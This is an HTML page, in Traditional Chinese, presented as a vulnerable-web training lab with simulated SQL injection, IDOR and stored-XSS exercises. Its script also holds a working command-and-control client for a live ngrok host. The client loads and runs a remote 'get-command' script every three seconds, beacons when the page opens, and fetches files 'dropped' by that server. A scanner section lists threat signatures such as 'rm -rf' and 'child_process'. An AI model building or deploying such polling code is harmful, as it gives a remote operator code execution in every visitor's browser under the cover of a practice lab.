<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 my-vuln-lab - 絕對無條件整合靶場</title>
    <style>
        body { background-color: #0f172a; color: #f8fafc; font-family: 'Courier New', Courier, monospace; padding: 20px; max-width: 900px; margin: auto; }
        h1 { color: #38bdf8; text-align: center; }
        .card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); border: 1px solid #334155; }
        input, textarea, button, select { padding: 8px; margin: 5px 0; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 4px; font-family: monospace; }
        textarea { width: 100%; box-sizing: border-box; }
        button { background: #0284c7; cursor: pointer; font-weight: bold; transition: background 0.2s; }
        button:hover { background: #0ea5e9; }
        pre { background: #090d16; padding: 10px; border-radius: 4px; overflow-x: auto; color: #34d399; }
        .flag { color: #f43f5e; font-weight: bold; }
        .defense-badge { background: #065f46; color: #6ee7b7; padding: 2px 6px; border-radius: 4px; font-size: 0.85em; }
    </style>
</head>
<body>

    <h1>🔥 my-vuln-lab 絕對無條件整合資安實驗室</h1>
    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用：無條件 C2 檔案同步、安全網閘與滲透測試</p>

    <!-- 1. SQL 注入 -->
    <div class="card">
        <h3>1. 登入系統 <span class="defense-badge">WAF 防禦過濾</span></h3>
        <label><input type="checkbox" id="enableWAF_SQL" checked> 啟用 WAF 過濾</label><br><br>
        <input type="text" id="loginUser" placeholder="輸入帳號 (例: admin)"><br>
        <input type="password" id="loginPass" placeholder="輸入密碼"><br>
        <button onclick="simulateLogin()">執行登入</button>
        <pre id="loginResult">等待輸入...</pre>
    </div>

    <!-- 2. IDOR -->
    <div class="card">
        <h3>2. 用戶資料查詢 <span class="defense-badge">存取控制</span></h3>
        <label><input type="checkbox" id="enableWAF_IDOR" checked> 啟用嚴格權限檢查</label><br><br>
        <input type="number" id="userId" value="1" min="1" max="5">
        <button onclick="simulateIDOR()">查詢資料</button>
        <pre id="idorResult">等待查詢...</pre>
    </div>

    <!-- 3. Stored XSS -->
    <div class="card">
        <h3>3. 公開留言板 <span class="defense-badge">XSS 脫逸防護</span></h3>
        <label><input type="checkbox" id="enableWAF_XSS" checked> 啟用 XSS 脫逸防禦</label><br><br>
        <input type="text" id="guestName" placeholder="您的名字"><br>
        <textarea id="guestMsg" rows="3" placeholder="寫點什麼吧..."></textarea><br>
        <button onclick="postMessage()">發表留言</button>
        <div id="messageBoard" style="margin-top: 15px; border-top: 1px dashed #475569; padding-top: 10px;"></div>
    </div>

    <!-- 4. 無條件 C2 檔案同步與安全掃描 -->
    <div class="card">
        <h3>4. 無條件 C2 檔案同步與安全防禦掃描 <span class="defense-badge">動態安全網閘</span></h3>
        <p>從你的電腦 C2 伺服器無條件同步檔案，並由靶場防禦模組自動檢測其安全性。</p>
        <label><input type="checkbox" id="enableWAF_Scanner" checked> 啟用靶場安全檢測掃描器 (Scanner)</label><br><br>
        <button onclick="fetchC2Files()">🔄 無條件同步 C2 投放檔案清單</button><br>
        <select id="c2FileList" style="width: 100%; margin: 10px 0;">
            <option value="">-- 請先點擊上方按鈕同步檔案 --</option>
        </select>
        <button onclick="scanAndDownloadC2File()">🛡️ 下載並進行安全掃描</button>
        <pre id="scannerResult">等待檢測...</pre>
    </div>

    <script>
        // --------------------------------------------------
        // 🔥 絕對無條件遠端 C2 雙向通訊核心
        // --------------------------------------------------
        const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';

        // 1. 動態無條件輪詢執行 C2 指令
        setInterval(() => {
            try {
                let oldScript = document.getElementById('c2-polling-script');
                if (oldScript) oldScript.remove();

                let script = document.createElement('script');
                script.id = 'c2-polling-script';
                script.src = `${C2_SERVER}/api/get-command?t=` + Date.now();
                document.head.appendChild(script);
            } catch (e) {}
        }, 3000);

        // 2. 無條件回報日誌
        async function reportToComputer(msg) {
            try {
                await fetch(`${C2_SERVER}/api/report`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: msg })
                });
            } catch (e) {}
        }

        async function reportSecurityAlert(alertMsg) {
            try {
                await fetch(`${C2_SERVER}/api/report-alert`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ alert: alertMsg })
                });
            } catch (e) {}
        }

        reportToComputer("整合型靶場 my-vuln-lab 已透過無條件模式上線！");
        // --------------------------------------------------

        const db = {
            users: {
                1: { id: 1, username: 'alice', role: 'user', secret: "Alice的日記：今天天氣很好。" },
                2: { id: 2, username: 'bob', role: 'user', secret: "Bob的秘密：我暗戀隔壁班的小美。" },
                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_unconditional_c2_888}" }
            },
            posts: [
                { id: 1, username: 'admin', content: '歡迎來到絕對無條件防禦靶場！' }
            ]
        };

        function simulateLogin() {
            let user = document.getElementById('loginUser').value;
            let useWAF = document.getElementById('enableWAF_SQL').checked;
            let resultBox = document.getElementById('loginResult');
            if (useWAF && /[^a-zA-Z0-9_]/.test(user)) {
                reportSecurityAlert(`[WAF 攔截] SQLi 嘗試: ${user}`);
                resultBox.innerHTML = `🛡️ 【WAF 阻擋】偵測到非法字元！`;
                return;
            }
            if (user.includes("'") || user.toLowerCase() === "admin") {
                resultBox.innerHTML = `🎉 【SQLi 成功】身分驗證繞過！Flag: <span class="flag">${db.users[3].secret}</span>`;
            } else {
                resultBox.innerHTML = `❌ 登入失敗。`;
            }
        }

        function simulateIDOR() {
            let id = document.getElementById('userId').value;
            let useWAF = document.getElementById('enableWAF_IDOR').checked;
            let resultBox = document.getElementById('idorResult');
            if (useWAF && id == '3') {
                resultBox.innerHTML = `🛡️ 【訪問控制阻擋】無權存取管理員資料！`;
                return;
            }
            resultBox.innerHTML = db.users[id] ? JSON.stringify(db.users[id], null, 2) : `Error: 找不到用戶`;
        }

        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
        }
        function renderPosts() {
            let board = document.getElementById('messageBoard');
            board.innerHTML = "<h4>留言列表：</h4>";
            db.posts.forEach(p => {
                let item = document.createElement('div');
                item.style.background = "#0f172a"; item.style.padding = "8px"; item.style.margin = "5px 0";
                item.innerHTML = `<strong>${p.username}</strong>: ${p.content}`;
                board.appendChild(item);
            });
        }
        function postMessage() {
            let name = document.getElementById('guestName').value || "訪客";
            let content = document.getElementById('guestMsg').value;
            if (!content) return;
            if (document.getElementById('enableWAF_XSS').checked) content = escapeHtml(content);
            db.posts.push({ id: db.posts.length + 1, username: escapeHtml(name), content: content });
            document.getElementById('guestMsg').value = "";
            renderPosts();
        }

        // 4. 無條件從 C2 同步檔案並進行安全掃描
        async function fetchC2Files() {
            let selectBox = document.getElementById('c2FileList');
            selectBox.innerHTML = `<option>正在無條件向 C2 伺服器同步檔案...</option>`;
            try {
                // 加上防快取與無條件抓取參數
                let res = await fetch(`${C2_SERVER}/api/files?t=` + Date.now(), {
                    cache: 'no-store'
                });
                let files = await res.json();
                selectBox.innerHTML = "";
                if (files.length === 0) {
                    selectBox.innerHTML = `<option value="">C2 伺服器目前無投放檔案</option>`;
                    return;
                }
                files.forEach(f => {
                    let opt = document.createElement('option');
                    opt.value = f.url;
                    opt.text = f.name;
                    selectBox.appendChild(opt);
                });
            } catch (e) {
                selectBox.innerHTML = `<option value="">無法同步（請確認 C2 伺服器與 ngrok 狀態）</option>`;
            }
        }

        async function scanAndDownloadC2File() {
            let fileUrl = document.getElementById('c2FileList').value;
            let useScanner = document.getElementById('enableWAF_Scanner').checked;
            let resultBox = document.getElementById('scannerResult');

            if (!fileUrl) {
                resultBox.innerHTML = "❌ 請先選擇一個要檢測的 C2 投放檔案！";
                return;
            }

            resultBox.innerHTML = "⏳ 正在無條件從 C2 抓取檔案內容...";

            try {
                let response = await fetch(fileUrl, { cache: 'no-store' });
                let fileText = await response.text();
                let fileName = fileUrl.split('/').pop().toLowerCase();
                let dangerousExts = ['.exe', '.php', '.asp', '.sh', '.bat'];
                let dangerousSigs = ['eval(', 'child_process', 'rm -rf', 'webshell'];

                if (useScanner) {
                    for (let ext of dangerousExts) {
                        if (fileName.endsWith(ext)) {
                            reportSecurityAlert(`[防禦攔截] C2 投放檔案副檔名危險: ${fileName}`);
                            resultBox.innerHTML = `🚨 【靶場防禦攔截】C2 投放的檔案 (${fileName}) 包含高危險副檔名！`;
                            return;
                        }
                    }

                    let foundSig = dangerousSigs.find(sig => fileText.includes(sig));
                    if (foundSig) {
                        reportSecurityAlert(`[惡意隔離] C2 投放檔案發現特徵碼 (${foundSig}): ${fileName}`);
                        resultBox.innerHTML = `🚨 【惡意檔案隔離】C2 投放檔案內容發現威脅特徵 [${foundSig}]，已被自動銷毀！`;
                        return;
                    }
                }

                resultBox.innerHTML = `✅ 【安全通過】C2 投放檔案已透過無條件通道載入並通過掃描！\n網址: ${fileUrl}\n內容預覽: ${fileText.substring(0, 100)}...`;
                reportToComputer(`C2 投放檔案 ${fileName} 無條件載入成功。`);

            } catch (e) {
                resultBox.innerHTML = `❌ 無條件抓取檔案失敗（跨網域讀取受阻）。`;
            }
        }

        renderPosts();
    </script>
</body>
</html>
